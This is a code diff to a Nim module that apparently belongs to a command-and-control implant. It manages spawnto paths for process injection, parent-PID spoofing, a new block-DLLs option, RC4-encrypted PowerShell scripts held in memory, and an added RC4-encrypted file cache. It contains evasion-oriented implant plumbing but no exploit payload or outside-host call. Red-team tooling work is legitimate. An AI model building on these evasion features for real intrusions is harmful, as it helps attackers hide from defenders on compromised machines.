@@ -1,10 +1,69 @@
 ## Global data storage for agent configuration
 ## Stores dynamic configuration like spawnto paths for process injection
 
-import std/[locks, json, sequtils]
+import std/[locks, tables]
 import nimcrypto/sysrand
+import utils/crypto
+
+# ============================================================================
+# Cross-platform File Cache (RC4 encrypted at rest)
+# ============================================================================
+type
+  CachedEntry = object
+    data: seq[byte]       # RC4-encrypted content
+    originalSize: int     # Original plaintext size
+
+var
+  fileCacheLock: Lock
+  fileCache: Table[string, CachedEntry]
+  fileCacheKey: seq[byte]  # RC4 key for file cache encryption
+
+proc initFileCache*() =
+  ## Initialize the file cache with a random encryption key
+  initLock(fileCacheLock)
+  fileCacheKey = newSeq[byte](32)
+  discard randomBytes(addr fileCacheKey[0], 32)
+  withLock fileCacheLock:
+    fileCache = initTable[string, CachedEntry]()
+
+proc cacheFile*(name: string, data: seq[byte]) =
+  ## Store a file in the cache, RC4-encrypted at rest
+  var encrypted = data
+  rc4(encrypted, fileCacheKey)
+  withLock fileCacheLock:
+    fileCache[name] = CachedEntry(data: encrypted, originalSize: data.len)
+
+proc getCachedFile*(name: string): seq[byte] =
+  ## Retrieve and decrypt a cached file by name. Returns empty seq if not found.
+  withLock fileCacheLock:
+    if fileCache.hasKey(name):
+      var decrypted = fileCache[name].data
+      rc4(decrypted, fileCacheKey)
+      return decrypted
+    return @[]
+
+proc removeCachedFile*(name: string): bool =
+  ## Remove a file from the cache. Returns true if it existed.
+  withLock fileCacheLock:
+    if fileCache.hasKey(name):
+      fileCache.del(name)
+      return true
+    return false
+
+proc getCachedFileInfo*(): seq[tuple[name: string, size: int]] =
+  ## Get names and sizes of all cached files
+  withLock fileCacheLock:
+    for name, entry in fileCache:
+      result.add((name: name, size: entry.originalSize))
+
+proc clearFileCache*() =
+  ## Remove all cached files
+  withLock fileCacheLock:
+    fileCache.clear()
 
 when defined(windows):
+  import std/[json, sequtils]
+
   type
     ImportedScript* = object
       name*: string
@@ -17,37 +76,13 @@ when defined(windows):
       spawntoX86*: string
       spawntoX86Args*: string
       ppid*: uint32
+      blockDlls*: bool
       importedPsScripts*: seq[ImportedScript]
       scriptEncKey*: seq[byte]  # RC4 key for script encryption
 
   var
     globalDataLock: Lock
     globalData: GlobalData
-
-  proc rc4Transform(data: seq[byte], key: seq[byte]): seq[byte] =
-    ## RC4 encrypt/decrypt (symmetric - same operation for both)
-    var
-      S: array[256, byte]
-      K: array[256, byte]
-      i, j: int = 0
-    
-    for idx in 0..255:
-      S[idx] = byte(idx)
-      K[idx] = key[idx mod key.len]
-    
-    j = 0
-    for idx in 0..255:
-      j = (j + S[idx].int + K[idx].int) mod 256
-      swap(S[idx], S[j])
-    
-    result = newSeq[byte](data.len)
-    i = 0
-    j = 0
-    for k in 0..<data.len:
-      i = (i + 1) mod 256
-      j = (j + S[i].int) mod 256
-      swap(S[i], S[j])
-      result[k] = data[k] xor S[(S[i].int + S[j].int) mod 256]
 
   proc initGlobalData*() =
     ## Initialize global data storage
@@ -58,10 +93,12 @@ when defined(windows):
       globalData.spawntoX86 = ""
       globalData.spawntoX86Args = ""
       globalData.ppid = 0
+      globalData.blockDlls = false
       globalData.importedPsScripts = @[]
       # Generate random RC4 key for script encryption
       globalData.scriptEncKey = newSeq[byte](32)
       discard randomBytes(globalData.scriptEncKey[0].addr, 32)
+    initFileCache()
 
   proc getSpawntoX64*(): (string, string) =
     ## Get spawnto_x64 path and arguments
@@ -95,11 +132,21 @@ when defined(windows):
     withLock globalDataLock:
       globalData.ppid = pid
 
+  proc getBlockDlls*(): bool =
+    ## Get block DLLs setting
+    withLock globalDataLock:
+      return globalData.blockDlls
+
+  proc setBlockDlls*(block_dlls: bool) =
+    ## Set block DLLs setting
+    withLock globalDataLock:
+      globalData.blockDlls = block_dlls
+
   proc addImportedPsScript*(name: string, content: string) =
     ## Add or replace an imported PowerShell script (stored encrypted)
     withLock globalDataLock:
-      let contentBytes = cast[seq[byte]](content)
-      let encrypted = rc4Transform(contentBytes, globalData.scriptEncKey)
+      var encrypted = cast[seq[byte]](content)
+      rc4(encrypted, globalData.scriptEncKey)
       # Replace if script with same name already exists
       var found = false
       for i in 0..<globalData.importedPsScripts.len:
@@ -118,7 +165,8 @@ when defined(windows):
     withLock globalDataLock:
       for script in globalData.importedPsScripts:
         if script.name == name:
-          let decrypted = rc4Transform(script.encryptedContent, globalData.scriptEncKey)
+          var decrypted = script.encryptedContent
+          rc4(decrypted, globalData.scriptEncKey)
           var content = newString(decrypted.len)
           for i in 0..<decrypted.len:
             content[i] = char(decrypted[i])
@@ -130,7 +178,8 @@ when defined(windows):
     withLock globalDataLock:
       for script in globalData.importedPsScripts:
         if script.name in names:
-          let decrypted = rc4Transform(script.encryptedContent, globalData.scriptEncKey)
+          var decrypted = script.encryptedContent
+          rc4(decrypted, globalData.scriptEncKey)
           var content = newString(decrypted.len)
           for i in 0..<decrypted.len:
             content[i] = char(decrypted[i])
@@ -140,7 +189,8 @@ when defined(windows):
     ## Decrypt and return all imported PowerShell scripts
     withLock globalDataLock:
       for script in globalData.importedPsScripts:
-        let decrypted = rc4Transform(script.encryptedContent, globalData.scriptEncKey)
+        var decrypted = script.encryptedContent
+        rc4(decrypted, globalData.scriptEncKey)
         var content = newString(decrypted.len)
         for i in 0..<decrypted.len:
           content[i] = char(decrypted[i])
@@ -168,13 +218,18 @@ when defined(windows):
       var scriptInfo: seq[JsonNode] = @[]
       for script in globalData.importedPsScripts:
         scriptInfo.add(%*{"name": script.name, "size": script.size})
+      var cacheInfo: seq[JsonNode] = @[]
+      for info in getCachedFileInfo():
+        cacheInfo.add(%*{"name": info.name, "size": info.size})
       let data = %*{
         "spawnto_x64": globalData.spawntoX64,
         "spawnto_x64_arguments": globalData.spawntoX64Args,
         "spawnto_x86": globalData.spawntoX86,
         "spawnto_x86_arguments": globalData.spawntoX86Args,
         "ppid": globalData.ppid,
-        "imported_ps_scripts": scriptInfo
+        "block_dlls": globalData.blockDlls,
+        "imported_ps_scripts": scriptInfo,
+        "cached_files": cacheInfo
       }
       return $data
 
@@ -187,7 +242,7 @@ when defined(linux):
 
   proc initGlobalData*() =
     ## Initialize global data storage (no-op on Linux)
-    discard
+    initFileCache()
 
   proc getGlobalDataJson*(): string =
     ## Get global data as JSON string (empty on Linux)
